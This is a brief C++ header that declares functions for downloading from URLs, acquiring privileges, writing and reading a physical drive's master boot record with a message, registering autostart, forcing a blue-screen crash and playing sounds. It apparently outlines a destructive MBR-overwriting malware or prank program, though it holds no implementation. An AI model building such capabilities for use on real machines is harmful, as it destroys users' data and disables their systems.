#pragma once

#include"std.h"


std::wstring GetDataFromURL(std::wstring url, bool &iserr);
bool DownloadFileFromURL(std::wstring url, std::wstring filepath);
bool GetPrivileges();
bool WritePhydriveMBR(unsigned int id, std::string msgstr);
std::string ReadPhydriveMBR(unsigned int id);
bool RegAutoStart();
bool MakeBlueScreen(unsigned int errid);
bool PlaySoundFile(std::wstring soundname, bool sync);